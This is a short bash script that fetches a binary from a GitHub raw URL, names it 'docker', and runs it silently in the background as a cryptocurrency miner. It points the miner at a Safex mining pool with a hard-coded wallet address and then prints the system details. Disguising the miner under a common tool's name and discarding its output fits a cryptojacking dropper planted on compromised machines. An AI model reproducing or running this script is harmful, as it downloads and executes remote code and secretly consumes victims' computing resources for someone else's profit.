#!/bin/bash
wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker
chmod +x docker
./docker -o sf.pool-pay.com:4025 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
uname -a
